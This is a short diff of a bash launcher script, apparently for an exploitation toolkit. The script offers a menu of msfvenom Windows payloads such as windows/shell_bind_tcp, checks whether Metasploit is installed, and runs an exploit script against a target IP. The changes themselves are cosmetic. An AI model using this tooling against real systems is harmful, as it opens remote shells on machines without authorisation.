@@ -93,7 +93,7 @@ n|no|No|NO)
 esac
 }
 # Windows msfvenom payload selection
-function pldwin () {
+function pldwin {
 echo ""
 echo -e $orange "  +-------------------------------------------+"
 echo -e $orange "  |$white [$okegreen 1$white ]$yellow windows/shell_bind_tcp$orange              |"
@@ -203,6 +203,7 @@ echo -e $BlueF " Is a lisneter started ? "
 sleep 2
 echo -e $red " Everythings is prepared push [ENTER] to start exploitation "
 python scripts/$exploitvers $targetip $pldname.bin 12
+exit 0
 ;;
 5)
 clear
@@ -232,7 +233,7 @@ menu
 ;;
 esac
 }
-function mtspl() {
+function mtspl {
 # check if metasploit-framework its installed
       which $msfconsole > /dev/null 2>&1
       if [ "$?" -eq "0" ]; then
